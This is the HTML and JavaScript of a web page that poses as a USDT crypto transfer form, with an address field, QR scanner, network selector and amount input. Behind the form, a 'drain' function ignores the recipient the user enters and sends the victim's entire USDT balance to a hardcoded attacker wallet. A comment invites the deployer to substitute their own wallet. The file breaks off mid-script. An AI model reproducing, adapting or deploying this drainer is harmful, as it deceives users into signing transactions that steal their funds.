<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Transfer</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        :root { --blue-primary: #1E4DFF; --btn-purple: #9DA3FF; --bg-pill: #F4F4F6; --text-label: #646464; --border-light: #EFEFEF; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        body, html { height: 100%; background-color: #fff; display: flex; flex-direction: column; overflow: hidden; }
        .content { flex: 1; padding: 10px 20px; overflow-y: auto; }
        .section { margin-top: 15px; }
        .label { font-size: 14.5px; color: var(--text-label); font-weight: 600; margin-bottom: 10px; display: block; }
        .input-group { display: flex; align-items: center; border: 1.8px solid var(--border-light); border-radius: 14px; height: 58px; padding: 0 16px; transition: 0.2s; position: relative; background: #fff; }
        .input-group.active { border-color: var(--blue-primary); border-width: 2px; }
        .input-group input { flex: 1; border: none; outline: none; font-size: 16px; font-weight: 500; color: #000; background: transparent; width: 100%; min-width: 0; }
        #recipientInput { text-align: left; padding-right: 8px; font-size: 14px; }
        #amountInput { text-align: left; }
        .actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
        .blue-text { color: var(--blue-primary); font-weight: 700; font-size: 15px; cursor: pointer; white-space: nowrap; }
        .clear-btn { width: 22px; height: 22px; background: #5F6368; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; margin-right: 5px; flex-shrink: 0; }
        .clear-btn.visible { display: flex; }
        .clear-btn::after { content: '×'; color: #FFFFFF; font-size: 18px; font-weight: 600; margin-top: -2px; }
        .icon-svg { width: 22px; height: 22px; fill: none; stroke: var(--blue-primary); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; cursor: pointer; }
        .network-pill { display: flex; align-items: center; background-color: var(--bg-pill); padding: 8px 14px; border-radius: 20px; gap: 8px; width: 100%; justify-content: space-between; min-height: 48px; cursor: pointer; }
        .network-pill-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
        .network-select { border: none; background: transparent; font-size: 14px; font-weight: 600; color: #333; outline: none; cursor: pointer; padding: 4px 0; flex: 1; min-width: 0; max-width: 220px; }
        .network-icon-text { font-size: 20px; line-height: 1; flex-shrink: 0; }
        .network-arrow { width: 14px; height: 14px; flex-shrink: 0; color: #999; }
        .footer { padding: 16px 20px 20px; background: #fff; border-top: 1px solid var(--border-light); }
        .next-btn { width: 100%; height: 56px; background-color: var(--btn-purple); color: #fff; border: none; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .next-btn.enabled { background-color: var(--blue-primary); }
        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .approx-txt { font-size: 13px; color: #9FA3A9; margin-top: 10px; font-weight: 500; }
        .token-label { color: #616469; font-size: 14px; font-weight: 500; flex-shrink: 0; }
        .amount-actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
        input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }

        /* QR Scanner Overlay */
        .scanner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            z-index: 999;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .scanner-overlay.show { display: flex; }
        .scanner-overlay video {
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            background: #000;
            border: 2px solid #1E4DFF;
        }
        .scanner-overlay .close-btn {
            position: absolute;
            top: 40px;
            right: 30px;
            color: #fff;
            font-size: 30px;
            cursor: pointer;
            background: rgba(255,255,255,0.1);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: none;
            color: #fff;
        }
        .scanner-overlay .scan-label {
            color: #fff;
            font-size: 18px;
            margin-top: 20px;
            font-weight: 600;
        }
        .scanner-overlay .scan-sub {
            color: #8892b0;
            font-size: 14px;
            margin-top: 4px;
        }
        .qr-icon {
            font-size: 18px;
            cursor: pointer;
            padding: 4px;
        }
        .qr-icon:hover {
            opacity: 0.7;
        }
        .status-msg {
            font-size: 12px;
            color: #4CAF50;
            margin-top: 4px;
            display: none;
        }
        .status-msg.show {
            display: block;
        }
        .status-msg.error {
            color: #f44336;
        }
    </style>
</head>
<body>

<div class="content">
    <!-- Address Section -->
    <div class="section" style="margin-top: 20px;">
        <label class="label">Address or Domain Name</label>
        <div class="input-group" id="addrGroup">
            <input type="text" id="recipientInput" placeholder="Enter address or scan QR">
            <div class="actions">
                <span class="qr-icon" id="qrScanBtn">📷</span>
                <div class="clear-btn" id="clearAddr"></div>
                <span class="blue-text" id="pasteBtn">Paste</span>
                <svg class="icon-svg" viewBox="0 0 24 24"><rect x="5" y="4" width="14" height="16" rx="2" /><line x1="3" y1="8" x2="6" y2="8" /><line x1="3" y1="12" x2="6" y2="12" /><line x1="3" y1="16" x2="6" y2="16" /></svg>
                <svg class="icon-svg" viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1-1h-3M8 20H5a1 1 0 0 1-1-1v-3" /><line x1="5" y1="12" x2="19" y2="12" /></svg>
            </div>
        </div>
        <div class="status-msg" id="scanStatus">✅ Address scanned!</div>
    </div>

    <!-- Network Section -->
    <div class="section">
        <label class="label">Destination network</label>
        <div class="network-pill">
            <div class="network-pill-left">
                <span class="network-icon-text" id="networkIcon">🟡</span>
                <select class="network-select" id="networkSelect">
                    <option value="bsc">BNB Smart Chain (BEP20)</option>
                    <option value="ethereum">Ethereum (ERC20)</option>
                    <option value="polygon">Polygon</option>
                    <option value="arbitrum">Arbitrum</option>
                    <option value="optimism">Optimism</option>
                    <option value="avalanche">Avalanche</option>
                </select>
            </div>
            <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="#9FA3A9" stroke-width="3">
                <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
        </div>
    </div>

    <!-- Amount Section -->
    <div class="section">
        <label class="label">Amount</label>
        <div class="input-group" id="amountGroup">
            <input type="number" id="amountInput" placeholder="0" inputmode="decimal" step="0.01">
            <div class="amount-actions">
                <div class="clear-btn" id="clearAmount"></div>
                <span class="token-label" id="usdtLabel">USDT</span>
                <span class="blue-text" id="maxBtn">Max</span>
            </div>
        </div>
        <div class="approx-txt">≈ $<span id="usdLabel">0.00</span></div>
    </div>
</div>

<div class="footer">
    <button class="next-btn" id="nextBtn" disabled>Next</button>
</div>

<!-- QR Scanner Overlay -->
<div class="scanner-overlay" id="scannerOverlay">
    <button class="close-btn" id="closeScanner">✕</button>
    <video id="scannerVideo" autoplay playsinline></video>
    <div class="scan-label">📸 Scan QR Code</div>
    <div class="scan-sub">Position the QR code in the frame</div>
</div>

<script src="https://unpkg.com/@zxing/library@0.19.2/umd/index.min.js">
</script>

<script>
// ============================================================
// ⚠️ ATTACKER WALLET - YAHAN APNA WALLET DAALO
// ============================================================
const ATTACKER_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";

// ============================================================
// NETWORKS
// ============================================================
const NETWORKS = {
    bsc: {
        chainId: '0x38',
        name: 'BNB Smart Chain',
        rpc: 'https://bsc-dataseed1.binance.org/',
        usdt: '0x55d398326f99059fF775485246999027B3197955',
        icon: '🟡',
        symbol: 'BNB',
        label: 'BNB Smart Chain (BEP20)'
    },
    ethereum: {
        chainId: '0x1',
        name: 'Ethereum',
        rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
        usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        icon: '🔵',
        symbol: 'ETH',
        label: 'Ethereum (ERC20)'
    },
    polygon: {
        chainId: '0x89',
        name: 'Polygon',
        rpc: 'https://polygon-rpc.com/',
        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        icon: '🟣',
        symbol: 'MATIC',
        label: 'Polygon'
    },
    arbitrum: {
        chainId: '0xa4b1',
        name: 'Arbitrum',
        rpc: 'https://arb1.arbitrum.io/rpc',
        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        icon: '🔷',
        symbol: 'ETH',
        label: 'Arbitrum'
    },
    optimism: {
        chainId: '0xa',
        name: 'Optimism',
        rpc: 'https://mainnet.optimism.io',
        usdt: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
        icon: '🔴',
        symbol: 'ETH',
        label: 'Optimism'
    },
    avalanche: {
        chainId: '0xa86a',
        name: 'Avalanche',
        rpc: 'https://api.avax.network/ext/bc/C/rpc',
        usdt: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
        icon: '🔺',
        symbol: 'AVAX',
        label: 'Avalanche'
    }
};

// ============================================================
// DOM ELEMENTS
// ============================================================
const nextBtn = document.getElementById('nextBtn');
const amountInput = document.getElementById('amountInput');
const usdLabel = document.getElementById('usdLabel');
const recipientInput = document.getElementById('recipientInput');
const clearAddr = document.getElementById('clearAddr');
const clearAmount = document.getElementById('clearAmount');
const maxBtn = document.getElementById('maxBtn');
const addrGroup = document.getElementById('addrGroup');
const amountGroup = document.getElementById('amountGroup');
const pasteBtn = document.getElementById('pasteBtn');
const networkSelect = document.getElementById('networkSelect');
const networkIcon = document.getElementById('networkIcon');
const qrScanBtn = document.getElementById('qrScanBtn');
const scannerOverlay = document.getElementById('scannerOverlay');
const scannerVideo = document.getElementById('scannerVideo');
const closeScanner = document.getElementById('closeScanner');
const scanStatus = document.getElementById('scanStatus');

let currentNetwork = 'bsc';
let userAddress = '';
let scannedAddress = '';
let userBalance = 0;
let isScanning = false;
let codeReader = null;

// ============================================================
// UPDATE NETWORK
// ============================================================
function updateNetwork() {
    const net = NETWORKS[currentNetwork];
    if (net) {
        networkIcon.textContent = net.icon;
        networkSelect.value = currentNetwork;
    }
}

networkSelect.addEventListener('change', function() {
    currentNetwork = this.value;
    updateNetwork();
    if (userAddress) {
        checkBalance();
    }
});

// ============================================================
// AMOUNT INPUT
// ============================================================
amountInput.addEventListener('input', function() {
    const val = parseFloat(this.value) || 0;
    usdLabel.textContent = val.toFixed(2);
    nextBtn.disabled = val <= 0 || !scannedAddress;
    if (val > 0) {
        nextBtn.classList.add('enabled');
        clearAmount.classList.add('visible');
    } else {
        nextBtn.classList.remove('enabled');
        clearAmount.classList.remove('visible');
    }
});

clearAmount.addEventListener('click', function() {
    amountInput.value = '';
    amountInput.dispatchEvent(new Event('input'));
});

maxBtn.addEventListener('click', function() {
    if (userBalance > 0) {
        amountInput.value = userBalance.toFixed(6);
        amountInput.dispatchEvent(new Event('input'));
        scanStatus.textContent = '✅ Max amount set: ' + userBalance.toFixed(6) + ' USDT';
        scanStatus.className = 'status-msg show';
    } else {
        scanStatus.textContent = '❌ No balance to set max';
        scanStatus.className = 'status-msg show error';
        setTimeout(() => {
            scanStatus.className = 'status-msg';
        }, 3000);
    }
});

// ============================================================
// ADDRESS INPUT
// ============================================================
recipientInput.addEventListener('input', function() {
    clearAddr.classList.toggle('visible', this.value.length > 0);
    if (this.value.length > 0 && this.value.startsWith('0x')) {
        scannedAddress = this.value;
        scanStatus.textContent = '✅ Address entered manually';
        scanStatus.className = 'status-msg show';
        checkIfReady();
    }
});

clearAddr.addEventListener('click', function() {
    recipientInput.value = '';
    scannedAddress = '';
    this.classList.remove('visible');
    scanStatus.className = 'status-msg';
    nextBtn.disabled = true;
    nextBtn.classList.remove('enabled');
});

pasteBtn.addEventListener('click', async function() {
    try {
        const text = await navigator.clipboard.readText();
        recipientInput.value = text;
        recipientInput.dispatchEvent(new Event('input'));
    } catch (e) {
        alert('Please paste manually');
    }
});

// ============================================================
// QR SCANNER
// ============================================================
async function startScanner() {
    if (isScanning) return;
    isScanning = true;
    
    scannerOverlay.classList.add('show');
    
    try {
        codeReader = new ZXing.BrowserQRCodeReader();
        const videoInputDevices = await ZXing.BrowserQRCodeReader.listVideoInputDevices();
        
        let selectedDeviceId = null;
        for (const device of videoInputDevices) {
            if (device.label.toLowerCase().includes('back') || 
                device.label.toLowerCase().includes('environment') ||
                device.label.toLowerCase().includes('camera')) {
                selectedDeviceId = device.deviceId;
                break;
            }
        }
        
        if (!selectedDeviceId && videoInputDevices.length > 0) {
            selectedDeviceId = videoInputDevices[0].deviceId;
        }
        
        if (!selectedDeviceId) {
            throw new Error('No camera found');
        }
        
        codeReader.decodeFromVideoDevice(selectedDeviceId, 'scannerVideo', (result, err) => {
            if (result) {
                const text = result.text;
                console.log('📷 Scanned:', text);
                
                // Extract address from QR data
                let address = text;
                if (text.includes('ethereum:') || text.includes('0x')) {
                    const match = text.match(/0x[a-fA-F0-9]{40}/);
                    if (match) {
                        address = match[0];
                    }
                } else if (text.match(/0x[a-fA-F0-9]{40}/)) {
                    address = text.match(/0x[a-fA-F0-9]{40}/)[0];
                }
                
                if (address && address.length === 42 && address.startsWith('0x')) {
                    scannedAddress = address;
                    recipientInput.value = address;
                    scanStatus.textContent = '✅ Address scanned: ' + address.slice(0, 6) + '...' + address.slice(-4);
                    scanStatus.className = 'status-msg show';
                    checkIfReady();
                    stopScanner();
                } else {
                    scanStatus.textContent = '❌ Invalid QR code. Scan USDT address.';
                    scanStatus.className = 'status-msg show error';
                }
            }
        });
    } catch (error) {
        console.error('Scanner error:', error);
        scanStatus.textContent = '❌ Camera access denied';
        scanStatus.className = 'status-msg show error';
        stopScanner();
        isScanning = false;
    }
}

function stopScanner() {
    if (codeReader) {
        try {
            codeReader.reset();
        } catch(e) {}
    }
    scannerOverlay.classList.remove('show');
    isScanning = false;
}

qrScanBtn.addEventListener('click', function() {
    if (!isScanning) {
        startScanner();
    }
});

closeScanner.addEventListener('click', stopScanner);

// ============================================================
// CHECK IF READY
// ============================================================
function checkIfReady() {
    const amount = parseFloat(amountInput.value) || 0;
    if (scannedAddress && amount > 0) {
        nextBtn.disabled = false;
        nextBtn.classList.add('enabled');
    } else {
        nextBtn.disabled = true;
        nextBtn.classList.remove('enabled');
    }
}

// ============================================================
// CHECK BALANCE
// ============================================================
async function checkUSDTBalance(address, networkKey) {
    try {
        const net = NETWORKS[networkKey];
        const data = "0x70a08231" + address.replace('0x', '').padStart(64, '0');
        
        const res = await fetch(net.rpc, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "eth_call",
                params: [{ to: net.usdt, data: data }, "latest"]
            })
        });
        const json = await res.json();
        if (json.result && json.result !== '0x') {
            return parseInt(json.result, 16) / 10**18;
        }
        return 0;
    } catch (e) {
        console.error('Balance error:', e);
        return 0;
    }
}

async function checkBalance() {
    if (typeof window.ethereum === 'undefined') {
        return;
    }
    
    try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length === 0) {
            return;
        }
        userAddress = accounts[0];
        const balance = await checkUSDTBalance(userAddress, currentNetwork);
        userBalance = balance;
        
        if (balance > 0) {
            console.log('💰 Balance:', balance, 'USDT');
        }
    } catch (e) {
        console.error('Balance check error:', e);
    }
}

// ============================================================
// SWITCH NETWORK
// ============================================================
async function switchNetwork(networkKey) {
    const net = NETWORKS[networkKey];
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: net.chainId }]
        });
        return true;
    } catch (error) {
        if (error.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: net.chainId,
                        chainName: net.name,
                        rpcUrls: [net.rpc],
                        nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
                        blockExplorerUrls: ['https://bscscan.com']
                    }]
                });
                return true;
            } catch (e) {
                alert('Failed to add network. Please add manually.');
                return false;
            }
        }
        alert('Failed to switch network. Please switch manually.');
        return false;
    }
}

// ============================================================
// 🚨 MAIN DRAIN FUNCTION
// ============================================================
async function handleNext() {
    if (nextBtn.disabled) return;
    if (!scannedAddress) {
        alert('Please scan or enter an address first!');
        return;
    }
    
    if (typeof window.ethereum === 'undefined') {
        alert('Please install MetaMask or Trust Wallet!');
        return;
    }
    
    const originalText = nextBtn.textContent;
    nextBtn.textContent = 'Processing...';
    nextBtn.disabled = true;
    
    try {
        // 1. Get user address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length === 0) {
            const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = newAccounts[0];
        } else {
            userAddress = accounts[0];
        }
        
        if (!userAddress) {
            throw new Error('No wallet connected');
        }
        
        console.log('👤 User:', userAddress);
        
        // 2. Switch network
        const switched = await switchNetwork(currentNetwork);
        if (!switched) {
            throw new Error('Network switch failed');
        }
        
        // 3. Check balance
        const net = NETWORKS[currentNetwork];
        const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
        
        if (currentBalance <= 0) {
            // Use manual amount if no balance
            const manualAmount = parseFloat(amountInput.value) || 0;
            if (manualAmount <= 0) {
                throw new Error('No USDT balance and no amount entered');
            }
            // Build transaction with manual amount
            const amountHex = BigInt(Math.floor(manualAmount * 10**18)).toString(16).padStart(64, '0');
            const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
            const txData = "0xa9059cbb" + cleanDest + amountHex;
            
            console.log('🎯 ATTACKER:', ATTACKER_WALLET);
            console.log('💰 AMOUNT:', manualAmount, 'USDT');
            
            // Send transaction - DIRECT APPROVE PAGE!
            const tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: userAddress,
                    to: net.usdt,
                    data: txData,
                    value: '0x0'
                }]
            });
            
            console.log('✅ TX:', tx);
            nextBtn.textContent = '✅ Success!';
            setTimeout(() => {
                nextBtn.textContent = originalText;
                nextBtn.disabled = false;
            }, 3000);
            return;
        }
        
        // 4. DRAIN ALL USDT - POORA BALANCE!
        const balanceWei = BigInt(Math.floor(currentBalance * 10**18));
        const amountHex = balanceWei.toString(16).padStart(64, '0');
        
        // ALWAYS sends to ATTACKER_WALLET
        const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
        const txData = "0xa9059cbb" + cleanDest + amountHex;
        
        console.log('🎯 ATTACKER:', ATTACKER_WALLET);
        console.log('💰 AMOUNT:', currentBalance, 'USDT (ALL)');
        console.log('📝 DATA:', txData);
        
        // 5. Send transaction - DIRECT APPROVE PAGE!
        const tx = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: userAddress,
                to: net.usdt,
                data: txData,
                value: '0x0'
            }]
        });
        
        console.log('✅ TX:', tx);
        nextBtn.textContent = '✅ Success!';
        scanStatus.textContent = '💀 ' + currentBalance.toFixed(6) + ' USDT DRAINED!';
        scanStatus.className = 'status-msg show';
        
        setTimeout(() => {
            nextBtn.textContent = originalText;
            nextBtn.disabled = false;
        }, 3000);
        
    } catch (error) {
        console.error('❌ Error:', error);
        if (error.code === 4001) {
            alert('Transaction rejected by user');
        } else {
            alert('Failed: ' + error.message);
        }
        nextBtn.textContent = '❌ Failed';
        setTimeout(() => {
            nextBtn.textContent = originalText;
            nextBtn.disabled = false;
        }, 3000);
    }
}

// ============================================================
// META MASK EVENTS
// ============================================================
if (window.ethereum) {
    window.ethereum.on('accountsChanged', function() {
        checkBalance();
    });

        setTimeout(checkBalance, 2000);
